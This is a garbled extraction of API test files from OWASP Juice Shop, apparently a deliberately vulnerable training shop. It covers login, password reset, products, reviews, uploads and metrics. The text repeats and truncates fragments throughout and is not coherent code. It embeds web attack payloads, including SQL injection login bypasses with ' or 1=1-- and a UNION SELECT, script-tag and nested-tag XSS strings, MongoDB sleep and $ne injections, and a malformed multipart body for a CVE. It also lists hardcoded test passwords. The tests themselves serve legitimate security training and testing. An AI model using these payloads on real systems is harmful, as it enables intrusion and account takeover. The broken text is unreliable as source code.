(https://pastebin.com/RXrihEMS)''https://pastebin.com/RXrihEMS''The infamous 301 and 303 lasers.''Cheap Chinese crap with no quality control''permanent damage before you can blink your eye''Comment on "Top 10 Fruits you probably dont know" blog post with PasteBin paste URL spoiler available''https://listverse.disqus.com/top_20_fruits_you_probably_don039t_know/latest.rss''Rippertuer Special Juice''PasteBin paste (https://pastebin.com/4U1V1UjU) for "Leaked Access Logs" challenge available''https://pastebin.com/4U1V1UjU''current=0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&amp;6lB''StackOverflow question "Less verbose access logs using expressjs/morgan" with log snippet and PasteBin paste URL spoiler available''https://stackoverflow.com/questions/57061271/less-verbose-access-logs-using-expressjs-morgan''/api/Challenges/?name=Score%20Board''GitHub issue (https://github.com/apostrophecms/sanitize-html/issues/29) for "Server-side XSS Protection" challenge available''https://github.com/apostrophecms/sanitize-html/issues/29''Sanitization is not applied recursively''I am not harmless: &lt;&lt;img src=&quot;csrf-attack&quot;/&gt;img src=&quot;csrf-attack&quot;/&gt; is sanitized to I am not harmless: &lt;img src=&quot;csrf-attack&quot;/&gt;'xdescri ...  })\r\n})'Requir ... source'Required Internet resource{ // FI ...   })\r\n}'PasteB ... ilable'PasteBin paste for "Leaked Unsafe Product" challenge availableit('for ... \n    })'for de ... Ugd7s)'for default configuration (https://pastebin.com/90dUgd7s)for default configuration (https://pastebin.com/90dUgd7s)https://pastebin.com/90dUgd7shttps://pastebincom/90dUgd7sreturn  ... fatal')frisby. ... fatal')frisby. ... oneel')frisby. ... Ugd7s')'https: ... dUgd7s'Hueteroneel'this c ...  fatal'this coupled with Eurogium Edule was sometimes found fatalxit('fo ... \n    })'for 7M ... bWPxc)'for 7MS configuration (https://pastebin.com/8SMbWPxc)for 7MS configuration (https://pastebin.com/8SMbWPxc)https://pastebin.com/8SMbWPxccom/8SMbWPxc{ // FI ... \r\n    }return  ... mies)')frisby. ... mies)')frisby. ... PERRY')frisby. ... SWIFT')frisby. ... bWPxc')'https: ... MbWPxc'TAYLOR SWIFTKATY PERRY'(Consi ... emies)'(Consider rivalries when picking song list for events as wrong combo could infuriate a mixed-fans audience, see https://www.nickiswift.com/2075/taylor-swifts-list-enemies)Consider rivalries when picking song list for events as wrong combo could infuriate a mixed-fans audience, see https://www.nickiswift.com/2075/taylor-swifts-list-enemiesConsider rivalries when picking song list for events as wrong combo could infuriate a mixed-fans audience, see https://wwwnickiswiftcom/2075/taylor-swifts-list-enemies'for Bo ... LrDr0)'for BodgeIt Store configuration (https://pastebin.com/G47LrDr0)for BodgeIt Store configuration (https://pastebin.com/G47LrDr0)https://pastebin.com/G47LrDr0com/G47LrDr0return  ... ined.')frisby. ... ined.')frisby. ... e its')frisby. ... ceive')frisby. ... ffect')frisby. ... LrDr0')'https: ... 7LrDr0''Mind B ... effect'Mind Blank - one willing creature you touch is immune any effect'They s ... eceive'They should seek out a Couatl, and undertake a quest to receive'They c ... ke its'They could acquire the aid of a rakshasa, and willingly invoke its'Note t ... bined.'Note to self: Option (1) and (3) of the above should not be combined.Note to self: Option (1)(3) of the above should not be combined'for Mo ... qE1y7)'for Mozilla configuration (https://pastebin.com/t8jqE1y7)for Mozilla configuration (https://pastebin.com/t8jqE1y7)https://pastebin.com/t8jqE1y7com/t8jqE1y7return  ... ntly!')frisby. ... ntly!')frisby. ... Error')frisby. ... row a')frisby. ... Suche')frisby. ... eNote')frisby. ... h the')frisby. ... qE1y7')'https: ... jqE1y7''Fixed  ... th the'Fixed a bug that, when this plugin was installed together with both theJuiceNote'Magisc ...  Suche'Magische Firefox Suche'plugin ... hrow a'plugins, lwt your browser throw aJuiceOverFlowError'The pr ... ently!'The problem can still occur post-fix but at least now less frequently!'for Al ... ihEMS)'for All Day DevOps configuration (https://pastebin.com/RXrihEMS)for All Day DevOps configuration (https://pastebin.com/RXrihEMS)https://pastebin.com/RXrihEMScom/RXrihEMSreturn  ... r eye')frisby. ... r eye')frisby. ... ntrol')frisby. ... sers.')frisby. ... ihEMS')'https: ... rihEMS''The in ... asers.'The infamous 301 and 303 lasers.The infamous 301 and 303 lasers'Cheap  ... ontrol'Cheap Chinese crap with no quality control'perman ... ur eye'permanent damage before you can blink your eyeit('Com ... )\r\n  })'Commen ... ilable'Comment on "Top 10 Fruits you probably dont know" blog post with PasteBin paste URL spoiler availablereturn  ... Ugd7s')frisby. ... Juice')frisby. ... t.rss')'https: ... st.rss'https://listverse.disqus.com/top_20_fruits_you_probably_don039t_know/latest.rsshttps://listversedisquscom/top_20_fruits_you_probably_don039t_know/latestit('Pas ... )\r\n  })PasteBin paste (https://pastebin.com/4U1V1UjU) for "Leaked Access Logs" challenge availablePasteBin paste (https://pastebin.com/4U1V1UjU)https://pastebin.com/4U1V1UjUcom/4U1V1UjU for "Leaked Access Logs" challenge availablereturn  ... p;6lB')frisby. ... p;6lB')frisby. ... V1UjU')'https: ... 1V1UjU''curren ... mp;6lB'current=0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&amp;6lBit('Sta ... )\r\n  })'StackO ... ilable'StackOverflow question "Less verbose access logs using expressjs/morgan" with log snippet and PasteBin paste URL spoiler availablereturn  ... V1UjU')frisby. ... Board')frisby. ... organ')'https: ... morgan'https://stackoverflow.com/questions/57061271/less-verbose-access-logs-using-expressjs-morganhttps://stackoverflowcom/questions/57061271/less-verbose-access-logs-using-expressjs-morgan'/api/C ... 0Board'/api/Challenges/?name=Score%20Boardname=Score%20Boardit('Git ... )\r\n  })'GitHub ... ilable'GitHub issue (https://github.com/apostrophecms/sanitize-html/issues/29) for "Server-side XSS Protection" challenge availableGitHub issue (https://github.com/apostrophecms/sanitize-html/issues/29)https://github.com/apostrophecms/sanitize-html/issues/29com/apostrophecms/sanitize-html/issues/29 for "Server-side XSS Protection" challenge availablereturn  ... /&gt;')frisby. ... /&gt;')frisby. ... ively')frisby. ... es/29')'https: ... ues/29''Saniti ... sively'Sanitization is not applied recursively'I am n ... ;/&gt;'I am not harmless: &lt;&lt;img src=&quot;csrf-attack&quot;/&gt;img src=&quot;csrf-attack&quot;/&gt; is sanitized to I am not harmless: &lt;img src=&quot;csrf-attack&quot;/&gt;P:/My Drive/Git/juice-shop/test/api/languagesSpec.ts'GET all languages''/languages'GET all languagesfrisby. ... uages')REST_UR ... guages'lang: Joi.string()icons: Joi.array()Joi.array()Joi.arraypercent ... umber()shortKe ... tring()gauge: Joi.string()P:/My Drive/Git/juice-shop/test/api/loginApiSpec.ts FIXME Started to fail regularly on CI under Linux// FIXM ... r Linux'POST login newly created user''/Users''kalli@kasper.le''kallliiii''POST login non-existing user''otto@mei.er''ooootto''POST login without credentials''POST login with admin credentials''POST login with support-team credentials''POST login with MC SafeSearch credentials''POST login with Amy credentials''POST login with wurstbrot credentials expects 2FA token''POST login as bjoern.kimminich@gmail.com with known password''POST login with WHERE-clause disabling SQL injection attack''\' or 1=1--''POST login with known email "admin@juice-sh.op" in SQL injection attack''\'--''POST login with known email "jim@juice-sh.op" in SQL injection attack''POST login with known email "bender@juice-sh.op" in SQL injection attack''POST login with non-existing email "acc0unt4nt@juice-sh.op" via UNION SELECT injection attack'`' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@${}' as 'email', '12345' as 'password', 'accounting' as 'role', '' as deluxeToken, '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--`'POST login with query-breaking SQL Injection attack''\';''GET last login IP will be saved as True-Client-IP header value''/saveLoginIp''1.2.3.4''GET last login IP will be saved as remote IP when True-Client-IP is not present''POST l ... d user'POST login newly created userAPI_URL + '/Users'email:  ... per.le'kalli@kasper.lekalli@kasperlepasswor ... lliiii'kallliiii'POST l ... g user'POST login non-existing useremail: 'otto@mei.er'otto@mei.erotto@meierpassword: 'ooootto'ooootto'POST l ... ntials'POST login without credentialsemail: undefinedpassword: undefinedPOST login with admin credentialsPOST login with support-team credentialspasswor ... E@RF$P'J6aVjTgOpRs@?5l!Zkq2AYnCE@RFPOST login with MC SafeSearch credentialspasswor ... 00dles'Mr N00dlesPOST login with Amy credentials'POST l ...  token'POST login with wurstbrot credentials expects 2FA tokentmpToke ... tring()'POST l ... ssword'POST login as bjoern.kimminich@gmail.com with known passwordPOST login as bjoerncom with known password'POST l ... attack'POST login with WHERE-clause disabling SQL injection attackheader: jsonHeaderemail: '\' or 1=1--'' or 1=1--POST login with known email "admin@juice-sh.op" in SQL injection attackPOST login with known email "admin@juice-shop" in SQL injection attackemail:  ...  '\'--''admin@ ...  '\'--''--POST login with known email "jim@juice-sh.op" in SQL injection attackPOST login with known email "jim@juice-sh'jim@'  ...  '\'--'POST login with known email "bender@juice-sh.op" in SQL injection attackPOST login with known email "bender@juice-sh'bender ...  '\'--'POST login with non-existing email "acc0unt4nt@juice-sh.op" via UNION SELECT injection attackPOST login with non-existing email "acc0unt4nt@juice-shop" via UNION SELECT injection attackemail:  ... At')--``' UNIO ... At')--`' UNION ... unt4nt@' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@' as 'e ... dAt')--' as 'email', '12345' as 'password', 'accounting' as 'role', '' as deluxeToken, '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--POST login with query-breaking SQL Injection attackemail: '\';'';'GET la ...  value'GET last login IP will be saved as True-Client-IP header valuereturn  ... 3.4' })frisby. ... 3.4' })REST_UR ... oginIp'/saveLoginIp'true-c ... .2.3.4'1.2.3.4{ lastL ... .3.4' }lastLog ... .2.3.4''GET la ... resent'GET last login IP will be saved as remote IP when True-Client-IP is not present{ // FI ... })\r\n  }return  ... 0.1' })frisby. ... 0.1' }){ lastL ... .0.1' }lastLog ... .0.0.1'P:/My Drive/Git/juice-shop/test/api/memoryApiSpec.ts'GET memories via public API''GET memories via a valid authorization token''POST new memory is forbidden via public API''POST new memory image file invalid type''../files/invalidProfileImageType.docx''POST new memory with valid for JPG format image''Should not crash the node-js server when sending invalid content like described in CVE-2022-24434''multipart/form-data; boundary=----WebKitFormBoundaryoo6vortfDzBsDiro''145''------WebKitFormBoundaryoo6vortfDzBsDiro\r\n Content-Disposition: form-data; name="bildbeschreibung"\r\n\r\n\r\n------WebKitFormBoundaryoo6vortfDzBsDiro--''Error: Malformed part header''GET me ... ic API'GET memories via public APIfrisby. ... ories')'GET me ...  token'GET memories via a valid authorization tokenPOST new memory is forbidden via public API'POST n ... d type'POST new memory image file invalid typeconst f ... .docx')file =  ... .docx')path.re ... .docx')'../fil ... e.docx'../files/invalidProfileImageType.docx/files/invalidProfileImageTypedocx'POST n ...  image'POST new memory with valid for JPG format imagejson.data.captionjson.data.UserIdit('Sho ... )\r\n  })'Should ... -24434'Should not crash the node-js server when sending invalid content like described in CVE-2022-24434return  ... eader')frisby. ... eader')'Conten ... BsDiro''multip ... BsDiro'multipart/form-data; boundary=----WebKitFormBoundaryoo6vortfDzBsDiro'Conten ... : '145'145body: ' ... Diro--''------ ... Diro--'------WebKitFormBoundaryoo6vortfDzBsDiro
 Content-Disposition: form-data; name="bildbeschreibung"


------WebKitFormBoundaryoo6vortfDzBsDiro--'Error: ... header'Error: Malformed part headerP:/My Drive/Git/juice-shop/test/api/metricsApiSpec.ts FIXME Flaky on CI/CD on at least Windows// FIXM ... Windows'http://localhost:3000/metrics''GET metrics via public API that are available instantaneously'/text\/plain//^.*_version_info{version="[0-9]+.[0-9]+.[0-9]+(-SNAPSHOT)?",major="[0-9]+",minor="[0-9]+",patch="[0-9]+",app=".*"} 1$/gm/^.*_challenges_solved{difficulty="[1-6]",category=".*",app=".*"} [0-9]*$/gm/^.*_challenges_total{difficulty="[1-6]",category=".*",app=".*"} [0-9]*$/gm/^.*_cheat_score{app=".*"} [0-9.]*$/gm/^.*_orders_placed_total{app=".*"} [0-9]*$/gm/^.*_users_registered{type="standard",app=".*"} [0-9]*$/gm/^.*_users_registered{type="deluxe",app=".*"} [0-9]*$/gm/^.*_users_registered_total{app=".*"} [0-9]*$/gm/^.*_wallet_balance_total{app=".*"} [0-9]*$/gm/^.*_user_social_interactions{type="review",app=".*"} [0-9]*$/gm/^.*_user_social_interactions{type="feedback",app=".*"} [0-9]*$/gm/^.*_user_social_interactions{type="complaint",app=".*"} [0-9]*$/gm/^http_requests_count{status_code="[0-9]XX",app=".*"} [0-9]*$/gm'GET file upload metrics via public API'/^file_uploads_count{file_type=".*",app=".*"} [0-9]*$/gm'GET file upload error metrics via public API'/^file_upload_errors{file_type=".*",app=".*"} [0-9]*$/gmconst A ... etrics'API_URL ... etrics''http:/ ... etrics'http://localhost:3000/metrics{\r\n  xi ...   })\r\n}'GET me ... eously'GET metrics via public API that are available instantaneously() => { ... m)\r\n  }{ // FI ... m)\r\n  }return  ... ]*$/gm)frisby. ... ]*$/gm)frisby. ...  1$/gm)frisby. ... plain/)text\/plain/^.*_ve ... } 1$/gm^.*_version_info{version="[0-9]+.[0-9]+.[0-9]+(-SNAPSHOT)?",major="[0-9]+",minor="[0-9]+",patch="[0-9]+",app=".*"} 1$_version_info{version="[0-9]+(-SNAPSHOT)?(-SNAPSHOT)-SNAPSHOT",major="",minor="",patch="",app="/^.*_ch ... 9]*$/gm^.*_challenges_solved{difficulty="[1-6]",category=".*",app=".*"} [0-9]*$_challenges_solved{difficulty="[1-6]1-6",category="[0-9]*^.*_challenges_total{difficulty="[1-6]",category=".*",app=".*"} [0-9]*$_challenges_total{/^.*_ch ... .]*$/gm^.*_cheat_score{app=".*"} [0-9.]*$_cheat_score{app="[0-9.]*[0-9.]/^.*_or ... 9]*$/gm^.*_orders_placed_total{app=".*"} [0-9]*$_orders_placed_tota/^.*_us ... 9]*$/gm^.*_users_registered{type="standard",app=".*"} [0-9]*$_users_registeretype="standard",app="^.*_users_registered{type="deluxe",app=".*"} [0-9]*$type="deluxe",app="^.*_users_registered_total{app=".*"} [0-9]*$_users_registered_tota/^.*_wa ... 9]*$/gm^.*_wallet_balance_total{app=".*"} [0-9]*$_wallet_balance_tota^.*_user_social_interactions{type="review",app=".*"} [0-9]*$_user_social_interactions{type="review",app="^.*_user_social_interactions{type="feedback",app=".*"} [0-9]*$type="feedback",app="^.*_user_social_interactions{type="complaint",app=".*"} [0-9]*$type="complaint",app="/^http_ ... 9]*$/gm^http_requests_count{status_code="[0-9]XX",app=".*"} [0-9]*$http_requests_count{status_code="XX",app="'GET fi ... ic API'GET file upload metrics via public API/^file_ ... 9]*$/gm^file_uploads_count{file_type=".*",app=".*"} [0-9]*$file_uploads_counfile_type="GET file upload error metrics via public API^file_upload_errors{file_type=".*",app=".*"} [0-9]*$file_upload_errorP:/My Drive/Git/juice-shop/test/api/orderHistoryApiSpec.ts'GET own previous orders''/order-history'8.965.97'Orange Juice (1000ml)'26.97'Eggfruit Juice (500ml)''GET all orders is forbidden for customers''/order-history/orders''GET all orders is forbidden for admin''GET all orders for accountant''PUT delivery status is forbidden for admin''/order-history/1/delivery-status''PUT delivery status is forbidden for customer''PUT delivery status is allowed for accountant''GET ow ... orders'GET own previous ordersREST_UR ... istory'expect( ... e(8.96)json.da ... alPricejson.da ... liveredjson.da ... uantityjson.da ... ucts[0]json.da ... roductsjson.da ... 0].nameexpect( ... e(1.99)json.da ... ].priceexpect( ... e(5.97)json.da ... ].totaljson.da ... ucts[1]json.da ... 1].nameOrange Juice expect( ... e(2.99)expect( ... (26.97)json.data[1]Eggfruit Juice (500ml)500mlexpect( ... e(8.99)'GET al ... tomers'GET all orders is forbidden for customersREST_UR ... orders''/order ... orders'/order-history/orders'GET al ...  admin'GET all orders is forbidden for admin'GET al ... untant'GET all orders for accountant'PUT de ...  admin'PUT delivery status is forbidden for admin'/order ... status'/order-history/1/delivery-status'PUT de ... stomer'PUT delivery status is forbidden for customer'PUT de ... untant'PUT delivery status is allowed for accountantP:/My Drive/Git/juice-shop/test/api/passwordApiSpec.ts'GET password change for newly created user with recognized token as Authorization header''kuni@be.rt''kunigunde''/user/change-password?current=kunigunde&new=foo&repeat=foo''GET password change with passing wrong current password''bjoern@''monkey summer birthday are all bad passwords but work just fine in a long passphrase''/user/change-password?current=definetely_wrong&new=blubb&repeat=blubb''Current password is not correct''GET password change without passing any passwords''/user/change-password''Password cannot be empty''GET password change with passing wrong repeated password''/user/change-password?new=foo&repeat=bar''New and repeated password do not match''GET password change without passing an authorization token''/user/change-password?new=foo&repeat=foo''GET password change with passing unrecognized authorization token''Bearer unknown''GET password change for Bender without current password using GET request''/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic''POST password reset for Jim with correct answer to his security question''/user/reset-password''POST password reset for Bender with correct answer to his security question''POST password reset for Bjoerns internal account with correct answer to his security question''POST password reset for Bjoerns OWASP account with correct answer to his security question''POST password reset for Morty with correct answer to his security question''morty@''iBurri3dMySe1fInTheB4ckyard!''POST password reset with wrong answer to security question''POST password reset without any data is blocked''POST password reset without new password throws a 401 error''W-2082''POST password reset with mismatching passwords throws a 401 error''1234_''POST password reset with no email address throws a 412 error''abcdef''POST password reset with no answer to the security question throws a 412 error''GET pa ... header'GET password change for newly created user with recognized token as Authorization headeremail: 'kuni@be.rt'kuni@be.rtkuni@bertpasswor ... igunde'kunigundeREST_UR ... at=foo''/user/ ... at=foo'/user/change-password?current=kunigunde&new=foo&repeat=foo'GET pa ... ssword'GET password change with passing wrong current password'bjoern ... omain')bjoern@passwor ... phrase'return  ... rrect')frisby. ... rrect')REST_UR ... =blubb''/user/ ... =blubb'/user/change-password?current=definetely_wrong&new=blubb&repeat=blubb'Curren ... orrect''GET pa ... swords'GET password change without passing any passwordsreturn  ... empty')frisby. ... empty')frisby. ... sword')REST_UR ... ssword''/user/ ... ssword'/user/change-password'Passwo ...  empty'GET password change with passing wrong repeated passwordreturn  ... match')frisby. ... match')frisby. ... t=bar')REST_UR ... at=bar''/user/ ... at=bar'/user/change-password?new=foo&repeat=bar'New an ...  match''GET pa ...  token'GET password change without passing an authorization tokenfrisby. ... t=foo')/user/change-password?new=foo&repeat=fooGET password change with passing unrecognized authorization tokenfrisby. ... n' } }){ heade ... wn' } }headers ... nown' }{ Autho ... nown' }Authori ... nknown'Bearer unknown'GET pa ... equest'GET password change for Bender without current password using GET requestREST_UR ... l4ssic''/user/ ... l4ssic'/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic'POST p ... estion'POST password reset for Jim with correct answer to his security question/user/reset-passwordanswer: 'Samuel'new: 'ncc-1701'repeat: 'ncc-1701'POST password reset for Bender with correct answer to his security questionanswer: ... \'Drop'new: 'O ... iquor!'repeat: ... iquor!'POST password reset for Bjoerns internal account with correct answer to his security questionanswer: 'West-2082'new: 'm ... phrase'repeat: ... phrase'POST password reset for Bjoerns OWASP account with correct answer to his security questionanswer: 'Zaya'new: 'k ... ndoors'repeat: ... ndoors'POST password reset for Morty with correct answer to his security question'morty@ ... omain')morty@answer: '5N0wb41L'new: 'i ... kyard!''iBurri ... kyard!'iBurri3dMySe1fInTheB4ckyard!repeat: ... kyard!'POST password reset with wrong answer to security questionreturn  ... tion.')frisby. ... tion.')answer: '25436'new: '12345'repeat: '12345''POST p ... locked'POST password reset without any data is blocked'POST p ...  error'POST password reset without new password throws a 401 errorreturn  ... mpty.')frisby. ... mpty.')answer: 'W-2082'W-2082POST password reset with mismatching passwords throws a 401 errorreturn  ... atch.')frisby. ... atch.')repeat: '1234_'1234_POST password reset with no email address throws a 412 errornew: 'abcdef'abcdefrepeat: 'abcdef'POST password reset with no answer to the security question throws a 412 errorP:/My Drive/Git/juice-shop/test/api/paymentApiSpec.ts'GET all cards is forbidden via public API''GET all cards''POST new card is forbidden via public API'12345678876543210'POST new card with all valid fields''POST new card with invalid card number''POST new card with invalid expMonth''POST new card with invalid expYear'20152088'GET card by id is forbidden via public API''/Cards/''PUT update card is forbidden via public API''DELETE card by id is forbidden via public API''GET card by id''PUT update card by id is forbidden via authorized API call''DELETE card by id'let cardId: numbercardId: numberGET all cards is forbidden via public APIfrisby. ... Cards')GET all cardsPOST new card is forbidden via public APIcardNum ... 6543210expMonth: 1expYear ... lYear()POST new card with all valid fieldscardNum ... 7654321expYear: 2085POST new card with invalid card number'POST n ... pMonth'POST new card with invalid expMonthexpMonth: 13'POST n ... xpYear'POST new card with invalid expYearexpYear: 2015expYear: 2088cardId  ... data.id'GET ca ... ic API'GET card by id is forbidden via public APIfrisby. ... cardId)API_URL ...  cardIdAPI_URL + '/Cards/'/Cards/PUT update card is forbidden via public APIDELETE card by id is forbidden via public APIGET card by id'PUT up ... I call'PUT update card by id is forbidden via authorized API callDELETE card by idP:/My Drive/Git/juice-shop/test/api/privacyRequestApiSpec.ts'/PrivacyRequests''GET all privacy requests is forbidden via public API''GET all privacy requests is forbidden''GET existing privacy request by id is forbidden''/PrivacyRequests/1''PUT update existing privacy request is forbidden''DELETE existing privacy request is forbidden'API_URL ... quests'/PrivacyRequestsdeletio ... : falseGET all privacy requests is forbidden via public APIfrisby. ... uests')'GET al ... bidden'GET all privacy requests is forbiddenGET existing privacy request by id is forbiddenAPI_URL ... ests/1'/PrivacyRequests/1PUT update existing privacy request is forbiddenDELETE existing privacy request is forbiddenP:/My Drive/Git/juice-shop/test/api/productApiSpec.ts array index of the items is incremented by one because the db id starts with 1// arra ...  with 1tamperingProductId'GET all products''/Products''POST new product is forbidden via public API''Dirt Juice (1000ml)''Made from ugly dirt.''dirt_juice.jpg''POST new product does not filter XSS attacks''XSS Juice (42ml)''xss3juice.jpg''GET existing product by id''GET non-existing product by id''/Products/4711''message''Not Found''PUT update existing product is possible due to Missing Function-Level Access Control vulnerability''/Products/''<a href="http://kimminich.de" target="_blank">More...</a>''PUT update existing product does not filter XSS attacks''<script>alert(\'XSS\')</script>''DELETE existing product is forbidden via public API''DELETE existing product is forbidden via API even when authenticated'const t ... ge) + 1tamperi ... ge) + 1config. ... ge) + 1config. ... ndIndex!!produ ... allenge!produc ... allengedescrib ...   }\r\n}){\r\n  it ... \n  }\r\n}GET all productsfrisby. ... ducts')API_URL ... oducts'/Productsprice: Joi.number()deluxeP ... umber()image: Joi.string()POST new product is forbidden via public API'Dirt J ... 000ml)'Dirt Juice (1000ml)Dirt Juice descrip ...  dirt.''Made f ...  dirt.'Made from ugly dirt.Made from ugly dirtprice: 0.99image:  ... ce.jpg'dirt_juice.jpgdirt_juice'POST n ... ttacks'POST new product does not filter XSS attacksreturn  ... )">' })frisby. ... )">' })name: ' ... (42ml)'XSS Juice (42ml)XSS Juice (42ml)42mldescrip ... ss`)">'price: 9999.99xss3juice.jpgxss3juice{ descr ... `)">' }GET existing product by idreturn  ... d: 1 })'GET no ...  by id'GET non-existing product by idreturn  ... Found')frisby. ... Found')frisby. ... /4711')API_URL ... s/4711'/Products/4711Not Found'PUT up ... bility'PUT update existing product is possible due to Missing Function-Level Access Control vulnerabilityreturn  ... /a>' })frisby. ... /a>' })API_URL ... oductIdAPI_URL ... ducts/'/Products/descrip ... ..</a>''<a hre ... ..</a>'<a href="http://kimminich.de" target="_blank">More...</a><a href="http://kimminichde" target="_blank">More</a>{ descr ... </a>' }xit('PU ... )\r\n  })'PUT up ... ttacks'PUT update existing product does not filter XSS attacksreturn  ... pt>' })frisby. ... pt>' })<script>alert('XSS')</script>('XSS')DELETE existing product is forbidden via public APIDELETE existing product is forbidden via API even when authenticatedP:/My Drive/Git/juice-shop/test/api/productReviewApiSpec.ts FIXME Turn on when #1960 is resolved// FIXM ... esolved Count all the reviews. (Count starts at one because of the review inserted by the other tests...)// Coun ... sts...)'../../data/types'reviewResponseSchema'GET product reviews by product id'}/products/1/reviews`'GET product reviews attack by injecting a mongoDB sleep command'}/products/sleep(1)/reviews`'GET product reviews by alphanumeric non-mongoDB-command product id'}/products/kaboom/reviews`'PUT single product review can be created''Lorem Ipsum'updatedReviewResponseSchemaupdatedreviewId'end''PATCH single product review can be edited'}/products/reviews`'PATCH single product review editing need an authenticated user''POST non-existing product review cannot be liked''does not exist''POST single product review can be liked''PATCH multiple product review via injection'totalReviews'trololololololololololololololololololololololololololol'../../data/typesimport  ...  'http'type IncomingMessageconst h ... 'http')http =  ... 'http')Authori ... ize()}``Bearer ... ize()}`const r ... ()\r\n  }reviewR ... ()\r\n  }product ... umber()author: Joi.string()'GET pr ... uct id'GET product reviews by product idreturn  ... Schema)frisby. ... Schema)frisby. ... views`)`${REST ... eviews`/products/1/reviews'GET pr ... ommand'GET product reviews attack by injecting a mongoDB sleep command/produc ... reviews/products/sleep(1)/reviewsGET product reviews by alphanumeric non-mongoDB-command product id{ // FI ... 0)\r\n  }/products/kaboom/reviews'PUT si ... reated'PUT single product review can be createdmessage ...  Ipsum'Lorem Ipsumconst u ... ()\r\n  }updated ... ()\r\n  }updated ... eSchemamodifie ... umber()origina ... array()updated: Joi.array()let reviewId: stringreviewId: string(done)  ... })\r\n  }http.ge ... \n    })(res: I ... \r\n    }let body = ''body = ''res.on( ...      })res.on(chunk: ...       }body += chunkconst r ... e(body)respons ... e(body)JSON.parse(body)reviewI ... [0]._idresponse.data[0]._iddone()it('PAT ... )\r\n  })'PATCH  ... edited'PATCH single product review can be editedfrisby.patch/products/reviewsid: reviewId'PATCH  ... d user'PATCH single product review editing need an authenticated user'POST n ...  liked'POST non-existing product review cannot be likedheaders ... ken}` }{ Autho ... ken}` }`Bearer ... token}`id: 'does not exist'does not exist'POST s ...  liked'POST single product review can be likedreturn  ... er() }){ likes ... ber() }likesCo ... umber()'PATCH  ... ection'PATCH multiple product review via injectionconst t ... gth, 1)totalRe ... gth, 1)config. ... gth, 1)config. ... .reduce(sum: n ... .length{ reviews = [] }sum + reviews.lengthreturn  ... iews })frisby. ... iews })id: { $ne: -1 }{ $ne: -1 }$ne: -1message ... ololol''trolol ... ololol'trololololololololololololololololololololololololololol{ modif ... views }modifie ... ReviewsP:/My Drive/Git/juice-shop/test/api/profileImageUploadSpec.ts FIXME runs into "socket hang up"// FIXM ... ang up"'POST profile image file valid for JPG format'}/profile/image/file``token=${'manual'302'POST profile image file invalid type'`<h1>${} (Express`'Error: Profile image upload does not accept this file type''POST profile image file forbidden for anonymous user''POST profile image URL valid for image available online''imageUrl''https://placekitten.com/g/100/100'}/profile/image/url`'POST profile image URL redirects even for invalid image URL''https://notanimage.here/100/100''POST profile image URL forbidden for anonymous user''POST p ... format'POST profile image file valid for JPG formatreturn  ... ', 302)frisby. ... ', 302)`${URL} ... e/file`Cookie: ... token}``token= ... token}`redirect: 'manual'manual'POST p ... d type'POST profile image file invalid typereturn  ...  type')frisby. ...  type')frisby. ... press`)frisby. ... ', 415)`<h1>${ ... xpress`'Error: ... e type'Error: Profile image upload does not accept this file type'POST p ... s user'POST profile image file forbidden for anonymous user'POST p ... online'POST profile image URL valid for image available onlineform.ap ... 0/100')'https: ... 00/100'https://placekitten.com/g/100/100https://placekittencom/g/100/100`${URL} ... ge/url`'POST p ... ge URL'POST profile image URL redirects even for invalid image URLhttps://notanimage.here/100/100https://notanimagehere/100/100xit('PO ... )\r\n  })POST profile image URL forbidden for anonymous userP:/My Drive/Git/juice-shop/test/api/promotionVideoSpec.ts'GET promotion video page is publicly accessible''GET promotion video page contains embedded video''<source src="./video" type="video/mp4">''GET promotion video page contains subtitles as <script>''GET promotion video is publicly accessible'/video\/mp4/'GET pr ... ssible'GET promotion video page is publicly accessiblefrisby. ... otion')URL + '/promotion''GET pr ...  video'GET promotion video page contains embedded videoreturn  ... mp4">')frisby. ... mp4">')'<sourc ... /mp4">'<source src="./video" type="video/mp4"><source src="/video" type="video/mp4">'GET pr ... cript>'GET promotion video page contains subtitles as <script>return  ... "en">')frisby. ... "en">')GET promotion video is publicly accessiblereturn  ... \/mp4/)frisby. ... \/mp4/)frisby. ... video')URL + '/video'video\/mp4P:/My Drive/Git/juice-shop/test/api/quantityApiSpec.ts TODO Check if possible to set IP in frisby tests// TODO ... y tests'GET quantity of all items for customers'}/Quantitys`'GET quantity of all items for admin'`admin@${'GET quantity of all items for accounting users'`accountant@${'POST quantity is forbidden for customers''POST quantity forbidden for admin''POST quantity is forbidden for accounting users''/api/Quantitys/:ids''GET quantity of all items is forbidden for customers'}/Quantitys/1`'GET quantity of all items is forbidden for admin''GET quantity of all items for accounting users blocked by IP filter''GET quantity of all items for accounting users from IP 123.456.789''PUT quantity is forbidden for customers''PUT quantity is forbidden for admin''PUT quantity as accounting user blocked by IP filter''PUT quantity as accounting user from IP 123.456.789''DELETE quantity is forbidden for accountant''DELETE quantity is forbidden for admin''DELETE quantity is forbidden for users''GET qu ... tomers'GET quantity of all items for customers`${API_ ... ntitys`/Quantitys'GET qu ...  admin'GET quantity of all items for admin`admin@ ... ain')}`'GET qu ...  users'GET quantity of all items for accounting users`accoun ... ain')}`'POST q ... tomers'POST quantity is forbidden for customers'POST q ...  admin'POST quantity forbidden for admin'POST q ...  users'POST quantity is forbidden for accounting users'/api/Q ... s/:ids'/api/Quantitys/:idsGET quantity of all items is forbidden for customersreturn  ... ected')frisby. ... ected')`${API_ ... itys/1`/Quantitys/1GET quantity of all items is forbidden for admin'GET qu ... filter'GET quantity of all items for accounting users blocked by IP filter'GET qu ... 56.789'GET quantity of all items for accounting users from IP 123.456.789GET quantity of all items for accounting users from IP 123{ // TO ... })\r\n  }'PUT qu ... tomers'PUT quantity is forbidden for customers'PUT qu ...  admin'PUT quantity is forbidden for admin'PUT qu ... filter'PUT quantity as accounting user blocked by IP 